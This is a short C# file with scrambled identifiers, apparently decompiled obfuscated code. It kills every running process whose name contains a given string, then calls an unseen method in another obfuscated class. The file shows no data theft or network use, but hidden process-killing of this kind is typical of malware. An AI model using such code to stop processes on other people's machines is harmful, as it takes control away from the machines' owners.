using System;
using System.Diagnostics;

namespace azCTgkmpGT;

public sealed class gXFVlZQVYEFYDYl
{
	public static bool jjBBzTbAShwz(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void ZLteozVxgGia(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (jjBBzTbAShwz(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					cQHVlxVivZVq.nowMmKZNVgcmM();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
